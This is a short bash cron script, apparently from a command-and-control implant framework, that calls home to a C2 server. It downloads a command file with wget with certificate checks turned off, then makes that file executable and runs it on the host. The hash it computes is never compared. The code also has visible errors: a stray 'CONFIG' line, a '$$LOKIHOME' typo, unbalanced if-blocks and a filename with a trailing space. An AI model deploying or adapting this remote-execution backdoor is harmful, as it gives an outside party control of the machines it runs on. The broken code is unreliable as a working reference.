#!/bin/bash
###############################################################################
# base-cron.sh - This is the file that will run every $CALLHOMEFREQ
#
# Requirements
#
# Mod History:
# 21 May 2019 - nju - created file from Loki framework
############################################################################### 


CONFIG

# Download a command file, if there's one there
$WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
if [ -f "$LOKIHOME/$MYNAME-command.txt " ]; then 
    # If we downloaded a file, download the hash for it 
	$WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate $C2PROTO$C2/$MYNAME.hash 
	
	# Create a hash of the file that we downloaded to compare to the hash that we downloaded
    sha256sum $LOKIHOME/$MYNAME-command.txt > $LOKIHOME/$MYNAME-command.check
fi


if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
	$LOG "Command File Downloaded, Checking Version"
	# If we downloaded a file, check to see if there is a current command file
	if [ -f "$LOKIHOME/$MYNAME-current.sh" ]; then
	# If there is a current command file, compare the two
	    $DIFF $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
		if [ $? == 1 ]; then
		$LOG "This is a new command file"
		# If they are different, check the hash of the first one (from the C2) and, if it's legit,
		#      overwrite the current file with the new file and run it
		$MV $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
		$CHMOD +x $$LOKIHOME/$MYNAME-current.sh
		./$LOKIHOME/$MYNAME-current.sh
		else
		$LOG "No Change in Command"
		# If they are the same, do nothing
		fi
else
    echo "LokiPro Nothing found"
fi

